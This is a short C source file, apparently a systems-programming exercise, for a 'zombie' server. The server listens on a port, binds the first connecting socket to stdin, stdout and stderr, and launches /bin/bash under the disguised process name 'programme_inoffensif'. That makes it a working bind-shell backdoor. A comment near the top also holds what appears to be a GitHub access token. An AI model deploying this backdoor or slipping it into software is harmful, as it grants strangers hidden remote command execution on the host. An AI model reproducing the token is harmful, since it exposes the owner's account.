#include <stdlib.h>
#include <unistd.h>
#include <string.h>
#include <sys/types.h>
#include <fcntl.h>
#include <stdarg.h>
#include <time.h>
#include <arpa/inet.h>
#include <netdb.h>
#include <netinet/in.h>
#include <sys/wait.h>
#include <sys/stat.h>
#include <sys/sem.h>
#include <sys/shm.h>
#include <sys/socket.h>
//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
#include "utils_v2.h"
#include "port.h"
#include "zombie.h"

Zombie initSocketServer(){
	int sockfd = ssocket();
	sbind(PORT, sockfd);
	slisten(sockfd, BACKLOG);
	Zombie zombie= {
		"zombie.c", "127.0.0.1", PORT, sockfd,getpid() 
	};
	return zombie;
}

void createBash (void * sock){
	int* socket = sock;
	for (int i = 0; i < 3; ++i){
		dup2(*socket,i);
	}
	sexecl("/bin/bash", "programme_inoffensif", NULL);

}

void done(){
	printf("fini\n");
	exit(0);
}

int main(int argc, char const *argv[]){
	ssigaction(SIGINT,done);
	Zombie zombie = initSocketServer();
	printf("Le serveur tourne sur le port : %i \n", PORT);	
	int newsockfd = saccept(zombie.sockFd);
	swrite(newsockfd, &zombie, sizeof(Zombie));

	fork_and_run1(createBash,&newsockfd);
	while(1){
		sleep(10);
	};
	sclose(newsockfd);
	sclose(zombie.sockFd);

	return 0;
}

